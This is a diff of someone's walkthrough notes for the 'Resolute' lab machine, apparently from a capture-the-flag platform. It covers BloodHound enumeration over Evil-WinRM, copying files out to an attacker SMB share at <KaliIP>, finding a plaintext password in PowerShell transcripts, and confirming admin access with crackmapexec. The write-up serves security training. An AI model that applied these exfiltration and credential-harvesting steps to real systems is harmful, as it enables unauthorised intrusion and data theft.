@@ -98,12 +98,74 @@ Resolute:
         We are able to upoad some exe:
             *Evil-WinRM* PS C:\users\melanie\Downloads> upload winPEASx64.exe
 
-    
+
+###############################################################################################
     Windows Melanie Account Ennumeration:
         Nothing crazy via WinPEAS
 
         We will user BloodHound:
+            *Evil-WinRM* PS C:\Users\melanie\Downloads> .\SharpHound.exe -c all --zipfilename MSedgeMap
+
+
+    We'll create our SMB Share to get BloudHound datas:
+        on Kali:
+            mkdir smb
+            impacket-smbserver cool $(pwd) -smb2support -user admin -password admin
+
+
+        on Window:
+            *Evil-WinRM* PS C:\Windows\System32> $passwd = convertto-securestring 'admin' -AsPlainText -Force
+            *Evil-WinRM* PS C:\Windows\System32> $passwd
+                output
+
+            *Evil-WinRM* PS C:\Windows\System32> $cred = New-Object System.Management.Automation.PSCredential('admin', $passwd)
+            *Evil-WinRM* PS C:\Windows\System32> $cred
+                output 
+
+            New-PSDrive -Name admin -PSProvider FileSystem -Credential $cred -Root \\<KaliIP>\cool
             
+            To upload file from Kali to Windows:
+                *Evil-WinRM* PS C:\> cd \\<KaliIP>\coolz
+                .\winPEASx64.exe
+
+            To extract files fron Windows to Kali:
+                *Evil-WinRM* PS C:\Users\melanie\Downloads>  Copy-Item "20240226121251_MSedgeMap.zip" -Destination "\\<KALI IP>\cool"
+
+    BloodHound Enumeration from melanie:
+        Kali:
+            sudo neo4j console
+                
+            Run BloodHound:    
+                /usr/lib/bloodhound/BloodHound --no-sandbox
+
+        If we forget our neo4j psswd:
+            locate neo4j | grep auth <---Find the file path
+            AND 
+            DELETE the File 
+            THEN 
+            RESTART neo4j
+                neo4j console
+                enter pswwd in localhost server 
+
+        RESULTS:
+            No Kerberostable USERS - NOTHING
+###############################################################################################
 
 
+    We go back to our C: File Path:
+        dir -force
+        cd "PSTranscripts"
+        cd 20191203
+            dir -force
+        
+        type "PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt"
 
+    We found ryan passwd:
+        ryan Serv3r4Admin4cc123!
+
+    We got a  Powened machine:
+        └─$ crackmapexec smb 10.10.10.169 -u "ryan" -p Serv3r4Admin4cc123!            
+            SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+            SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
+
+    
